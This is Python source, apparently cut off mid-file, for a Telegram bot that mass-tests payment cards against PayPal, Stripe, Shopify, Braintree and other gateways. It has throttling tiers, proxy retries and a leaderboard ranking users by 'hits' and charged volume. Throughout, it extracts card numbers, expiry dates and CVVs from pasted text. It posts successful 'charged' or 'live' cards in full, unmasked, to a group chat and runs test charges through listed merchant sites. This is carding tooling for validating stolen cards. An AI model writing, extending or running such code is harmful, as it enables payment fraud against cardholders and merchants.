import asyncio
import re
import time
import httpx
import traceback
import random
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from telegram.constants import ParseMode
from telegram.error import TimedOut
import sys
from typing import Dict, Tuple, List, Optional
import json
import base64
from user_agent import generate_user_agent
import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder
import string
from pathlib import Path
import hashlib
import uuid
import concurrent.futures
from concurrent.futures import ThreadPoolExecutor, as_completed
import sqlite3
from collections import deque
import statistics
from bs4 import BeautifulSoup
from asyncio import Semaphore
import threading
import urllib.parse
import psutil
import signal
from contextlib import asynccontextmanager
from dataclasses import dataclass, field
from typing import Any
import logging
import functools
import atexit
import concurrent.futures
import asyncio
from functools import partial
import asyncio
import random
import aiohttp
from aiohttp import ClientTimeout, ClientConnectorError

# Create a dedicated thread pool for blocking operations
MASS_CHECK_EXECUTOR = concurrent.futures.ThreadPoolExecutor(max_workers=5)

# Store running tasks per user to prevent duplicates
running_mass_checks = {}


# ============ GLOBAL THREAD POOL ============
thread_pool = concurrent.futures.ThreadPoolExecutor(max_workers=500)

# User task queues to prevent blocking
user_queues = {}
user_queue_locks = {}
MAX_CONCURRENT_USERS = 2000
# REMOVED the global semaphore that was blocking all users
# user_semaphore = Semaphore(MAX_CONCURRENT_USERS)

# ============ SESSION RECOVERY SYSTEM ============
SESSION_STATE_FILE = "session_state.json"
PENDING_BATCHES_FILE = "pending_batches.json"

class SessionRecovery:
    """Save and restore session state for crash recovery"""
    
    def __init__(self):
        self.active_sessions = {}
        self.pending_batches = {}
        self.load_state()
        self.load_pending_batches()
        
    def save_state(self):
        """Save current session state to file"""
        try:
            serializable_sessions = {}
            for user_id, session_data in self.active_sessions.items():
                if isinstance(session_data, dict):
                    clean_data = {k: v for k, v in session_data.items() 
                                 if not k.startswith('_') and not callable(v)}
                    serializable_sessions[str(user_id)] = clean_data
            
            with open(SESSION_STATE_FILE, 'w') as f:
                json.dump({
                    'active_sessions': serializable_sessions,
                    'timestamp': time.time()
                }, f, indent=2)
        except Exception as e:
            print(f"⚠️ Error saving session state: {e}")
    
    def load_state(self):
        """Load session state from file"""
        if Path(SESSION_STATE_FILE).exists():
            try:
                with open(SESSION_STATE_FILE, 'r') as f:
                    data = json.load(f)
                    self.active_sessions = {int(k): v for k, v in data.get('active_sessions', {}).items()}
                print(f"🔄 Loaded {len(self.active_sessions)} saved sessions")
            except Exception as e:
                print(f"⚠️ Error loading session state: {e}")
    
    def save_pending_batch(self, user_id: int, batch_data: dict):
        """Save a pending batch for recovery"""
        try:
            if str(user_id) not in self.pending_batches:
                self.pending_batches[str(user_id)] = []
            
            self.pending_batches[str(user_id)].append({
                'batch_id': str(uuid.uuid4())[:8],
                'gateway': batch_data.get('gateway'),
                'total_cards': batch_data.get('total_cards', 0),
                'processed_cards': batch_data.get('processed_cards', 0),
                'cards': batch_data.get('cards', [])[:10],
                'start_time': batch_data.get('start_time', time.time()),
                'amount': batch_data.get('amount'),
                'site': batch_data.get('site'),
                'status': 'pending'
            })
            
            with open(PENDING_BATCHES_FILE, 'w') as f:
                json.dump(self.pending_batches, f, indent=2)
                
            print(f"💾 Saved pending batch for user {user_id}")
        except Exception as e:
            print(f"⚠️ Error saving pending batch: {e}")
    
    def load_pending_batches(self):
        """Load pending batches from file"""
        if Path(PENDING_BATCHES_FILE).exists():
            try:
                with open(PENDING_BATCHES_FILE, 'r') as f:
                    self.pending_batches = json.load(f)
                print(f"🔄 Loaded pending batches for {len(self.pending_batches)} users")
            except Exception as e:
                print(f"⚠️ Error loading pending batches: {e}")
    
    def get_user_pending_batches(self, user_id: int) -> list:
        """Get pending batches for a user"""
        return self.pending_batches.get(str(user_id), [])
    
    def clear_user_batches(self, user_id: int):
        """Clear pending batches for a user after recovery"""
        if str(user_id) in self.pending_batches:
            del self.pending_batches[str(user_id)]
            try:
                with open(PENDING_BATCHES_FILE, 'w') as f:
                    json.dump(self.pending_batches, f, indent=2)
            except Exception as e:
                print(f"⚠️ Error clearing pending batches: {e}")

session_recovery = SessionRecovery()

# ============ AUTO-RETRY MANAGER ============
class AutoRetryManager:
    """Automatically retry failed cards with different proxies"""
    
    def __init__(self, max_retries=1):
        self.max_retries = max_retries
        self.retry_queue = asyncio.Queue()
        self.retry_counts = {}
        self.retry_lock = asyncio.Lock()
        
    async def add_for_retry(self, card: str, gateway: str, original_result: dict, 
                            user_id: int, tier: str, proxy_used: str = None):
        """Add a failed card to retry queue"""
        async with self.retry_lock:
            card_key = f"{user_id}:{card}"
            
            if card_key not in self.retry_counts:
                self.retry_counts[card_key] = 0
            
            if self.retry_counts[card_key] < self.max_retries:
                self.retry_counts[card_key] += 1
                await self.retry_queue.put({
                    'card': card,
                    'gateway': gateway,
                    'user_id': user_id,
                    'tier': tier,
                    'attempt': self.retry_counts[card_key],
                    'original_result': original_result,
                    'proxy_used': proxy_used
                })
                print(f"🔄 Queued card for retry #{self.retry_counts[card_key]}")
                return True
        return False
    
    async def get_next_retry(self):
        """Get next card to retry"""
        try:
            return await asyncio.wait_for(self.retry_queue.get(), timeout=1.0)
        except asyncio.TimeoutError:
            return None
    
    def clear_user_retries(self, user_id: int):
        """Clear retry counts for a user"""
        keys_to_remove = [k for k in self.retry_counts if k.startswith(f"{user_id}:")]
        for k in keys_to_remove:
            del self.retry_counts[k]

auto_retry_manager = AutoRetryManager(max_retries=2)

# ============ LEADERBOARD SYSTEM ============
LEADERBOARD_FILE = "leaderboard.json"

class Leaderboard:
    """Track and display top users by hits"""
    
    def __init__(self):
        self.stats = self.load_stats()
        self.categories = ['daily', 'weekly', 'monthly', 'alltime']
        
    def load_stats(self):
        """Load leaderboard stats from file"""
        if Path(LEADERBOARD_FILE).exists():
            try:
                with open(LEADERBOARD_FILE, 'r') as f:
                    return json.load(f)
            except Exception as e:
                print(f"⚠️ Error loading leaderboard: {e}")
                return self._init_stats()
        return self._init_stats()
    
    def _init_stats(self):
        """Initialize empty stats structure"""
        return {
            'daily': {},
            'weekly': {},
            'monthly': {},
            'alltime': {},
            'last_reset': {
                'daily': time.time(),
                'weekly': time.time(),
                'monthly': time.time()
            }
        }
    
    def save_stats(self):
        """Save leaderboard stats to file"""
        try:
            with open(LEADERBOARD_FILE, 'w') as f:
                json.dump(self.stats, f, indent=2)
        except Exception as e:
            print(f"⚠️ Error saving leaderboard: {e}")
    
    def record_hit(self, user_id: int, username: str, gateway: str, amount: float):
        """Record a hit for leaderboard"""
        now = time.time()
        day_key = datetime.now().strftime("%Y-%m-%d")
        week_key = f"{datetime.now().year}-W{datetime.now().isocalendar()[1]}"
        month_key = datetime.now().strftime("%Y-%m")
        
        user_str = str(user_id)
        
        if user_str not in self.stats['daily']:
            self.stats['daily'][user_str] = {'username': username, 'hits': 0, 'volume': 0, 'gateways': {}}
        self.stats['daily'][user_str]['hits'] = self.stats['daily'][user_str].get('hits', 0) + 1
        self.stats['daily'][user_str]['volume'] = self.stats['daily'][user_str].get('volume', 0) + amount
        self.stats['daily'][user_str]['gateways'][gateway] = self.stats['daily'][user_str]['gateways'].get(gateway, 0) + 1
        self.stats['daily'][user_str]['last_hit'] = now
        
        if user_str not in self.stats['weekly']:
            self.stats['weekly'][user_str] = {'username': username, 'hits': 0, 'volume': 0, 'gateways': {}}
        self.stats['weekly'][user_str]['hits'] = self.stats['weekly'][user_str].get('hits', 0) + 1
        self.stats['weekly'][user_str]['volume'] = self.stats['weekly'][user_str].get('volume', 0) + amount
        
        if user_str not in self.stats['monthly']:
            self.stats['monthly'][user_str] = {'username': username, 'hits': 0, 'volume': 0, 'gateways': {}}
        self.stats['monthly'][user_str]['hits'] = self.stats['monthly'][user_str].get('hits', 0) + 1
        self.stats['monthly'][user_str]['volume'] = self.stats['monthly'][user_str].get('volume', 0) + amount
        
        if user_str not in self.stats['alltime']:
            self.stats['alltime'][user_str] = {'username': username, 'hits': 0, 'volume': 0, 'gateways': {}}
        self.stats['alltime'][user_str]['hits'] = self.stats['alltime'][user_str].get('hits', 0) + 1
        self.stats['alltime'][user_str]['volume'] = self.stats['alltime'][user_str].get('volume', 0) + amount
        self.stats['alltime'][user_str]['gateways'][gateway] = self.stats['alltime'][user_str]['gateways'].get(gateway, 0) + 1
        
        self.save_stats()
    
    def check_reset(self):
        """Check if periods need reset"""
        now = time.time()
        
        if now - self.stats['last_reset']['daily'] > 86400:
            self.stats['daily'] = {}
            self.stats['last_reset']['daily'] = now
        
        if now - self.stats['last_reset']['weekly'] > 604800:
            self.stats['weekly'] = {}
            self.stats['last_reset']['weekly'] = now
        
        if now - self.stats['last_reset']['monthly'] > 2592000:
            self.stats['monthly'] = {}
            self.stats['last_reset']['monthly'] = now
        
        self.save_stats()
    
    def get_top_users(self, period='daily', limit=10) -> str:
        """Get formatted leaderboard"""
        self.check_reset()
        
        if period not in self.stats:
            return f"❌ Invalid period. Choose: {', '.join(self.categories)}"
        
        data = self.stats[period]
        
        if not data:
            return f"📊 No data for {period} period yet."
        
        sorted_users = sorted(data.items(), key=lambda x: x[1]['hits'], reverse=True)[:limit]
        
        medals = ['🥇', '🥈', '🥉']
        
        result = f"🏆 <b>Leaderboard - {period.upper()}</b>\n\n"
        
        for i, (user_id, user_data) in enumerate(sorted_users, 1):
            medal = medals[i-1] if i <= 3 else f"{i}."
            username = user_data.get('username', f"User {user_id[:6]}")
            hits = user_data.get('hits', 0)
            volume = user_data.get('volume', 0)
            
            result += f"{medal} <b>{username}</b>\n"
            result += f"   ├─ 💳 Hits: {hits}\n"
            result += f"   └─ 💰 Volume: ${volume:.2f}\n"
            
            if user_data.get('gateways'):
                top_gateway = max(user_data['gateways'].items(), key=lambda x: x[1])
                result += f"      Best: {top_gateway[0]} ({top_gateway[1]} hits)\n"
            
            result += "\n"
        
        return result

leaderboard = Leaderboard()

# ============ PROGRESS BAR ============
class ProgressBar:
    """Generate visual progress bars for Telegram"""
    
    @staticmethod
    def create(completed: int, total: int, width: int = 10) -> str:
        """Create a text-based progress bar"""
        if total == 0:
            return "[" + "░" * width + "]"
        
        filled = int((completed / total) * width)
        bar = "▓" * filled + "░" * (width - filled)
        percentage = (completed / total) * 100
        
        return f"[{bar}] {percentage:.1f}% ({completed}/{total})"
    
    @staticmethod
    def create_with_stats(completed: int, total: int, stats: dict, width: int = 10) -> str:
        """Create progress bar with additional stats"""
        bar = ProgressBar.create(completed, total, width)
        
        if stats:
            approved = stats.get('approved', 0)
            charged = stats.get('charged', 0)
            declined = stats.get('declined', 0)
            errors = stats.get('errors', 0)
            
            bar += f"\n📊 Stats: ✅{approved} 🔥{charged} ❌{declined} ⚠️{errors}"
        
        return bar

# ============ AUTO STRIPE DEFAULT SITES ============
AUTO_STRIPE_DEFAULT_SITES = [
    "dilaboards.com",
    # Add more sites here as you find them
]


async def get_autosopi_session():
    global autosopi_session
    if autosopi_session is None or autosopi_session.closed:
        timeout = ClientTimeout(total=45, connect=15, sock_read=35)
        autosopi_session = aiohttp.ClientSession(
            timeout=timeout,
            connector=aiohttp.TCPConnector(limit=20, ttl_dns_cache=300)
        )
    return autosopi_session

# User's preferred site storage
user_auto_stripe_site = {}  # user_id -> site
user_site_index = {}  # user_id -> current index for rotation
# ============ AUTO STRIPE SITE MANAGER ============
class AutoStripeSiteManager:
    """Manage sites for Auto Stripe API with per-user rotation"""
    
    def __init__(self, default_sites):
        self.default_sites = default_sites
        self.user_sites = {}  # Custom site per user
        self.user_indices = {}  # Rotation index per user
        self.site_stats = {}  # Track site performance
        
    def get_site_for_user(self, user_id: int) -> str:
        """Get a site for a specific user"""
        # If user has a custom site set, use that
        if user_id in self.user_sites:
            return self.user_sites[user_id]
        
        # Otherwise rotate through default sites
        if not self.default_sites:
            return None
            
        # Get or create rotation index for this user
        if user_id not in self.user_indices:
            self.user_indices[user_id] = 0
        
        # Get next site in rotation
        site = self.default_sites[self.user_indices[user_id]]
        
        # Update index for next time
        self.user_indices[user_id] = (self.user_indices[user_id] + 1) % len(self.default_sites)
        
        return site
    
    def set_user_site(self, user_id: int, site: str):
        """Set a custom site for a user"""
        self.user_sites[user_id] = site
        # Remove from rotation indices if present
        if user_id in self.user_indices:
            del self.user_indices[user_id]
    
    def reset_user_to_default(self, user_id: int):
        """Reset user to use default rotation"""
        if user_id in self.user_sites:
            del self.user_sites[user_id]
        # Reset index
        self.user_indices[user_id] = 0
    
    def get_default_sites_list(self) -> list:
        """Get list of default sites"""
        return self.default_sites.copy()
    
    def add_default_site(self, site: str):
        """Add a new default site (admin only)"""
        if site not in self.default_sites:
            self.default_sites.append(site)
            return True
        return False
    
    def remove_default_site(self, site: str):
        """Remove a default site (admin only)"""
        if site in self.default_sites:
            self.default_sites.remove(site)
            return True
        return False
    
    def record_site_result(self, site: str, success: bool):
        """Track site performance"""
        if site not in self.site_stats:
            self.site_stats[site] = {'success': 0, 'total': 0}
        
        self.site_stats[site]['total'] += 1
        if success:
            self.site_stats[site]['success'] += 1
    
    def get_site_stats(self) -> dict:
        """Get site performance statistics"""
        return self.site_stats

# Create global instance
auto_stripe_site_manager = AutoStripeSiteManager(AUTO_STRIPE_DEFAULT_SITES)


# ============ PAYPAL WORKER CONFIGURATION ============
PAYPAL_WORKER_CONFIG = {
    "free": {"workers": 1, "delay": 1.0, "concurrency": 1},
    "premium": {"workers": 5, "delay": 1.0, "concurrency": 1},
    "ultimate": {"workers": 5, "delay": 1.0, "concurrency": 1},
    "admin": {"workers": 5, "delay": 1.0, "concurrency": 1}
}

# ============ STC1 API CONFIGURATION ============
STC1_API_BASE = "https://web-production-26e3e.up.railway.app"
STC1_CHECK_ENDPOINT = "/check"
STC1_API_URL = f"{STC1_API_BASE}{STC1_CHECK_ENDPOINT}"


# Add this function near the top with other helper functions
def is_hit_response(response_text: str) -> Tuple[bool, str]:
    """
    Check if a response should trigger a hit notification.
    Returns (is_hit, hit_type)
    """
    if not response_text:
        return False, None
    
    response_upper = response_text.upper()
    
    # Define hit patterns with their hit types
    hit_patterns = [
        ("CHARGE 2$", "CHARGED"),
        ("fraudulent", "CHARGED 🔥"),  # ADD THIS LINE
        ("CHARGED", "CHARGED"),
        ("ORDER COMPLETED", "CHARGED"),
        ("ORDER COMPLETED 💎", "CHARGED"),
        ("NEW PAYMENT METHOD ADDED SUCCESSFULLY", "LIVE"),
        ("EXISTING_ACCOUNT_RESTRICTED", "LIVE"),
        ("PAID", "CHARGED"),
        ("SUCCESS", "CHARGED"),
        ("APPROVED", "LIVE"),
    ]
    
    for pattern, hit_type in hit_patterns:
        if pattern in response_upper:
            print(f"🎯 HIT DETECTED! Pattern: {pattern}, Type: {hit_type}")
            return True, hit_type
    
    return False, None

# ============ CARD FORMATTER - FIXED ============
class CardFormatter:
    """Extract card details from ANY format automatically"""
    
    @staticmethod
    def _extract_single_card(line: str) -> Optional[str]:
        """Extract single card from any text format - for single card checks"""
        # Remove any extra whitespace
        line = re.sub(r'\s+', ' ', line.strip())
        
        # Try to find card number (15-16 digits)
        card_num_match = re.search(r'\b(\d{15,16})\b', line)
        if not card_num_match:
            return None
        
        card_num = card_num_match.group(1)
        
        # Remove the card number from the line to find other components
        remaining = line.replace(card_num, '')
        
        # Find all remaining numbers
        numbers = re.findall(r'\b(\d+)\b', remaining)
        
        if len(numbers) < 3:
            return None
        
        # We need month, year, cvv
        # Month is typically 1-12, could be 01-12
        month = None
        year = None
        cvv = None
        
        # First, try to identify month (1-12)
        for num in numbers:
            num_str = str(num)
            if len(num_str) <= 2:  # Month is 1-2 digits
                month_val = int(num_str)
                if 1 <= month_val <= 12:
                    month = num_str.zfill(2)
                    numbers.remove(num)
                    break
        
        if not month:
            return None
        
        # Now look for year (2 or 4 digits)
        for num in numbers[:]:
            num_str = str(num)
            if len(num_str) in [2, 4]:
                # If it's 2 digits, we'll keep as is - don't convert automatically
                year = num_str
                numbers.remove(num)
                break
        
        if not year:
            return None
        
        # The remaining number should be CVV (3-4 digits)
        if numbers:
            cvv = str(numbers[0])
            if len(cvv) in [3, 4]:
                return f"{card_num}|{month}|{year}|{cvv}"
        
        return None
    
    @staticmethod
    def extract_cards(text: str) -> List[str]:
        """
        Extract cards in ANY format and convert to standard format
        Returns list of cards in format: card_number|month|year|cvv
        """
        cards = []
        lines = text.strip().split('\n')
        
        for line in lines:
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            
            card = CardFormatter._extract_single_card(line)
            if card:
                cards.append(card)
        
        return cards
    
    @staticmethod
    def extract_single_card_from_text(text: str) -> Optional[str]:
        """Extract single card from any text format - for single card checks"""
        return CardFormatter._extract_single_card(text)
    
    @staticmethod
    def detect_separator(text: str) -> str:
        """Detect what separator is being used"""
        if '|' in text:
            return '|'
        elif ',' in text:
            return ','
        elif ':' in text:
            return ':'
        elif ' ' in text and len(text.split()) == 4:
            return ' '
        return None

card_formatter = CardFormatter()

# ============ QUICK COMMANDS ============
class QuickCommandManager:
    """Handle quick shortcut commands"""
    
    def __init__(self):
        self.commands = {
            'pp': {'action': 'gateway', 'value': 'paypal', 'desc': 'Switch to PayPal'},
            'sp': {'action': 'gateway', 'value': 'shopify', 'desc': 'Switch to Shopify'},
            'rz': {'action': 'gateway', 'value': 'razorpay', 'desc': 'Switch to Razorpay'},
            'st': {'action': 'gateway', 'value': 'stripe_charge', 'desc': 'Switch to Stripe Charge'},
            'sta': {'action': 'gateway', 'value': 'stripe_auth', 'desc': 'Switch to Stripe Auth'},
            'bt': {'action': 'gateway', 'value': 'braintree', 'desc': 'Switch to Braintree'},
            'au': {'action': 'gateway', 'value': 'autosopi', 'desc': 'Switch to Autosopi'},
            'pf': {'action': 'gateway', 'value': 'payflow', 'desc': 'Switch to Payflow'},
            'ch': {'action': 'amount', 'desc': 'Set amount (usage: ch 2.99)'},
            'px': {'action': 'proxy', 'desc': 'Proxy commands (px list, px test)'},
            'lb': {'action': 'leaderboard', 'desc': 'Show leaderboard'},
            'rec': {'action': 'recover', 'desc': 'Recover interrupted sessions'},
            'help': {'action': 'help', 'desc': 'Show quick commands help'}
        }
    
    def parse(self, text: str) -> Tuple[bool, str, dict]:
        """Parse a quick command"""
        text = text.lower().strip()
        
        if text in self.commands:
            cmd = self.commands[text]
            return True, text, cmd
        
        for prefix, cmd in self.commands.items():
            if text.startswith(prefix + ' '):
                args = text[len(prefix):].strip()
                return True, prefix, {**cmd, 'args': args}
        
        return False, "", {}
    
    def get_help(self) -> str:
        """Get help text for quick commands"""
        help_text = "⚡ <b>Quick Commands</b>\n\n"
        for cmd, data in self.commands.items():
            help_text += f"• <code>/{cmd}</code> - {data['desc']}\n"
        help_text += "\nExamples:\n"
        help_text += "<code>/ch 2.99</code> - Set amount to $2.99\n"
        help_text += "<code>/sta</code> - Switch to Stripe Auth\n"
        help_text += "<code>/lb daily</code> - Daily leaderboard\n"
        return help_text

quick_cmd_manager = QuickCommandManager()

# ============ AUTO-RESPONDER (DISABLED) ============
class AutoResponder:
    """Automatically respond to common user questions - DISABLED"""
    
    def __init__(self):
        self.responses = {}
        self.conversation_history = {}
        
    def get_response(self, text: str, user_id: int) -> Optional[str]:
        """Always returns None - auto-responder disabled"""
        return None

auto_responder = AutoResponder()

if sys.version_info >= (3, 14):
    try:
        asyncio.get_event_loop()
    except RuntimeError:
        asyncio.set_event_loop(asyncio.new_event_loop())

# ============ USER MANAGEMENT ============
def load_users():
    """Load users from users.json file"""
    if Path('users.json').exists():
        try:
            with open('users.json', 'r') as f:
                return json.load(f)
        except Exception as e:
            print(f"⚠️ Error loading users.json: {e}")
            return {}
    return {}

def is_user_authorized(user_id, chat_type=None):
    """Check if user exists in users.json - but allow all in group chats"""
    
    # FREE FOR ALL IN GROUP CHATS
    if chat_type in ['group', 'supergroup']:
        return True
    
    # For private chats, check authorization
    users = load_users()
    return str(user_id) in users

# ============ TELEGRAM GROUP VERIFICATION ============
REQUIRED_GROUP = "-1003887571060"
REQUIRED_GROUP_LINK = "https://t.me/+QeNrb5W8eJQyY2E1"
GROUP_ID = -1003887571060

# ============ HIT NOTIFICATION CONFIG ============
HIT_NOTIFICATION_GROUP_ID = -1003887571060
HIT_NOTIFICATION_ENABLED = True
HIT_NOTIFICATION_THRESHOLD = "charged/New Payment Method Added Successfully"

# ============ HIT STORAGE CONFIG ============
HITS_FILE = "hits.txt"
HITS_BATCH_SIZE = 1000
hit_counter = 0
last_hit_file_time = time.time()

# ============ SPEED CONTROL CONFIG ============
TIER_SPEEDS = {
    "free": 100,
    "premium": 1000,
    "ultimate": 3000,
    "admin": 10000
}

TIER_CONCURRENCY = {
    "free": 10,
    "premium": 30,
    "ultimate": 30,
    "admin": 50,
}

class SpeedController:
    """Precision speed controller to maintain exact cards per hour"""
    
    def __init__(self, target_cph: int, tier: str):
        self.target_cph = target_cph
        self.tier = tier
        self.target_interval = 3600 / target_cph if target_cph > 0 else 0
        self.last_check_time = time.time()
        self.check_times = deque(maxlen=500)
        self.response_times = deque(maxlen=200)
        self.adjustment_factor = 0.8
        self.total_checks = 0
        self.start_time = time.time()
        self.min_interval = 0.01
        self.consecutive_fast = 0
        self._lock = asyncio.Lock()
        
    async def wait_if_needed(self):
        """Wait exactly the right amount to maintain target speed - OPTIMIZED"""
        if self.target_cph <= 0:
            return
        
        async with self._lock:    
            self.total_checks += 1
            now = time.time()
            
            elapsed_total = now - self.start_time
            current_cph = (self.total_checks / elapsed_total) * 3600 if elapsed_total > 0 else 0
            
            if current_cph > self.target_cph * 1.1:
                self.adjustment_factor *= 1.2
                self.consecutive_fast = 0
            elif current_cph < self.target_cph * 0.9:
                self.adjustment_factor *= 0.8
                self.consecutive_fast += 1
            else:
                self.consecutive_fast = 0
            
            if self.consecutive_fast > 3:
                self.adjustment_factor *= 0.7
                self.consecutive_fast = 0
            
            self.adjustment_factor = max(0.3, min(3.0, self.adjustment_factor))
            
            target_interval_adjusted = (3600 / self.target_cph) * self.adjustment_factor
            ideal_time = self.last_check_time + target_interval_adjusted
            
            if now < ideal_time:
                wait_time = ideal_time - now
                if wait_time > self.min_interval:
                    if wait_time < 0.05:
                        await asyncio.sleep(0)
                    else:
                        await asyncio.sleep(wait_time)
            
            self.check_times.append(time.time())
            self.last_check_time = time.time()
    
    def record_response(self, response_time: float):
        """Record gateway response time for statistics"""
        self.response_times.append(response_time)
    
    def get_stats(self) -> dict:
        """Get current speed statistics"""
        now = time.time()
        elapsed = now - self.start_time
        
        if len(self.check_times) < 2:
            return {"current_cph": 0, "avg_response": 0, "target_cph": self.target_cph}
        
        thirty_seconds_ago = now - 30
        recent_checks = [t for t in self.check_times if t > thirty_seconds_ago]
        current_cph = len(recent_checks) * 120
        
        avg_response = statistics.mean(self.response_times) if self.response_times else 0
        
        return {
            "current_cph": current_cph,
            "target_cph": self.target_cph,
            "avg_response": avg_response,
            "total_checks": self.total_checks,
            "elapsed_minutes": elapsed / 60,
            "completion_percent": (current_cph / self.target_cph) * 100 if self.target_cph > 0 else 0,
            "adjustment_factor": self.adjustment_factor
        }

# ============ CONNECTION POOL MANAGER ============
class ConnectionPool:
    """Manage HTTP connection pools for better performance"""
    
    def __init__(self, max_connections: int = 500):
        self.max_connections = max_connections
        self.pools = {}
        self.counter = 0
        self.lock = asyncio.Lock()
        
    async def get_client(self, gateway: str = "default"):
        """Get or create an HTTP client for a gateway"""
        async with self.lock:
            if gateway not in self.pools:
                limits = httpx.Limits(max_keepalive_connections=100, max_connections=self.max_connections)
                timeout = httpx.Timeout(30.0, connect=5.0, read=20.0)
                self.pools[gateway] = httpx.AsyncClient(
                    timeout=timeout,
                    limits=limits,
                    follow_redirects=True,
                    http2=True
                )
                print(f"✅ Created connection pool for {gateway} (max: {self.max_connections})")
            
            return self.pools[gateway]
    
    async def close_all(self):
        """Close all connections"""
        for client in self.pools.values():
            await client.aclose()
        self.pools.clear()
        print("🔌 Connection pool closed")

connection_pool = ConnectionPool(max_connections=500)

import os
from pathlib import Path

# Get the absolute path to the directory containing this script
BASE_DIR = Path(__file__).parent

HIT_GIF_PATHS = [
    str(BASE_DIR / "g1.mp4"),
    str(BASE_DIR / "g2.mp4"),
    str(BASE_DIR / "g3.mp4"),
    str(BASE_DIR / "g4.mp4"),
    str(BASE_DIR / "g5.mp4"),
]

def get_random_gif_path(gateway: str = None) -> str:
    existing_gifs = [g for g in HIT_GIF_PATHS if Path(g).exists()]
    if not existing_gifs:
        print(f"⚠️ No GIF files found. Checked paths: {HIT_GIF_PATHS}")
        return None
    return random.choice(existing_gifs)

# ============ RANDOM GIF SELECTOR ============

def get_random_gif_path(gateway: str = None) -> str:
    """
    Get a random GIF path from the pool
    """
    # Use default pool only
    existing_gifs = [g for g in HIT_GIF_PATHS if Path(g).exists()]
    
    if not existing_gifs:
        print(f"⚠️ No GIF files found in {HIT_GIF_PATHS}")
        return None
    
    selected = random.choice(existing_gifs)
    print(f"🎲 Selected random GIF: {selected}")
    return selected


def format_hit_result_for_gif_full_card(
    card: str,
    gateway: str,
    response: str,
    price: str,
    bin_info: tuple,
    username: str = None
) -> str:
    """
    Format card result with FULL CARD (no masking)
    """
    bin_info_text, bank, country, currency_code, country_code = bin_info
    
    # Parse card parts
    card_parts = card.split('|')
    card_num = card_parts[0] if len(card_parts) > 0 else card
    exp_month = card_parts[1] if len(card_parts) > 1 else "XX"
    exp_year = card_parts[2] if len(card_parts) > 2 else "XX"
    cvv = card_parts[3] if len(card_parts) > 3 else "XXX"
    
    # Show full card number (no masking)
    card_display = card_num
    
    # Determine status based on response
    response_upper = response.upper()
    
    if "CHARGED" in response_upper or "ORDER COMPLETED" in response_upper or "PAID" in response_upper:
        status_display = "CHARGED"
        status_emoji = "🔥"
    elif "INSUFFICIENT" in response_upper:
        status_display = "INSUFFICIENT FUNDS"
        status_emoji = "💰"
    elif "CVV LIVE" in response_upper or "INCORRECT_CVV" in response_upper:
        status_display = "CVV LIVE"
        status_emoji = "✅"
    elif "3D" in response_upper or "OTP" in response_upper:
        status_display = "3D REQUIRED"
        status_emoji = "🔐"
    else:
        status_display = "LIVE"
        status_emoji = "💳"
    
    # Extract brand from BIN info
    brand = bin_info_text.split(' - ')[0] if ' - ' in bin_info_text else bin_info_text
    if len(brand) > 15:
        brand = brand[:15]
    
    # Format bank name
    bank_display = bank if bank != 'N/A' else "Unknown"
    if len(bank_display) > 25:
        bank_display = bank_display[:22] + "..."
    
    # Format country with flag emoji
    country_name = country.replace('🌐', '').strip()
    country_flag = "🌍"
    
    # Simple flag mapping
    flag_map = {
        'PHILIPPINES': '🇵🇭', 'USA': '🇺🇸', 'UNITED STATES': '🇺🇸',
        'UK': '🇬🇧', 'UNITED KINGDOM': '🇬🇧', 'CANADA': '🇨🇦',
        'AUSTRALIA': '🇦🇺', 'INDIA': '🇮🇳', 'UAE': '🇦🇪'
    }
    for key, flag in flag_map.items():
        if key in country_name.upper():
            country_flag = flag
            break
    
    # Format price
    try:
        price_float = float(price.replace('$', ''))
        price_display = f"${price_float:.2f}"
    except:
        price_display = price
    
    # Get current time
    current_time = datetime.now().strftime('%H:%M')
    
    # Use provided username or default
    user_display = username or "User"
    
    # Gateway display name
    gateway_display = {
        "paypal": "PayPal",
        "autosopi": "Autosopi",
        "auto_stripe": "Auto Stripe",
        "shopify": "Shopify"
    }.get(gateway.lower(), gateway)
    
    # Exact format
    result = (
        f"<b>Status</b> → {status_emoji} {status_display}\n"
        f"<b>Card</b> → <code>{card_display}</code> | {exp_month} | {exp_year} | {cvv}\n"
        f"<b>Gateway</b> → {gateway_display} {price_display}\n"
        f"<b>Response</b> → {response[:80]}\n"
        f"<b>Brand</b> → {brand}\n"
        f"<b>Issuer</b> → {bank_display}\n"
        f"<b>Country</b> → {country_flag} {country_name}\n"
        f"<b>User</b> → {user_display}\n"
        f"<b>Dev</b> → @Cypher099 \n"
    )
    
    return result


async def send_gif_with_result_combined(
    update: Update,
    context: ContextTypes.DEFAULT_TYPE,
    card: str,
    gateway: str,
    response: str,
    price: str,
    bin_info: tuple,
    status_category: str,  # "charged" or "live" or "approved"
    username: str = None
):
    """
    Send random LOCAL GIF file WITH the result text as CAPTION
    Sends GIF for BOTH charged AND live cards
    """
    message = update.effective_message
    
    # Format the result text
    result_text = format_hit_result_for_gif_full_card(
        card, gateway, response, price, bin_info, username
    )
    
    # ============ SEND GIF FOR BOTH CHARGED AND LIVE ============
    if status_category in ["charged", "live", "approved"]:
        # Get random GIF path for this gateway
        gif_path = get_random_gif_path(gateway)
        
        if gif_path and Path(gif_path).exists():
            print(f"🎲 Sending GIF for {gateway} - Status: {status_category}")
            
            try:
                with open(gif_path, 'rb') as media_file:
                    await message.reply_animation(
                        animation=media_file,
                        caption=result_text,
                        parse_mode=ParseMode.HTML
                    )
                    print(f"✅ GIF sent for {status_category} card!")
                    return
            except Exception as e:
                print(f"⚠️ Animation failed: {e}")
                try:
                    with open(gif_path, 'rb') as media_file:
                        await message.reply_video(
                            video=media_file,
                            caption=result_text,
                            parse_mode=ParseMode.HTML
                        )
                    print(f"✅ Video sent for {status_category} card!")
                    return
                except Exception as e2:
                    print(f"⚠️ Video failed: {e2}")
    
    # If no GIF or not a hit, just send text
    await message.reply_text(result_text, parse_mode=ParseMode.HTML)


# ============ BIN CACHE SYSTEM ============
class BINCache:
    """Local SQLite cache for BIN lookups - instant results"""
    
    def __init__(self, db_path='bin_cache.db'):
        self.db_path = db_path
        self._init_db()
        self.memory_cache = {}
        self.hits = 0
        self.misses = 0
        
    def _init_db(self):
        """Initialize SQLite database"""
        try:
            with sqlite3.connect(self.db_path, timeout=10) as conn:
                conn.execute('''
                    CREATE TABLE IF NOT EXISTS bin_cache (
                        bin TEXT PRIMARY KEY,
                        bin_info TEXT,
                        bank TEXT,
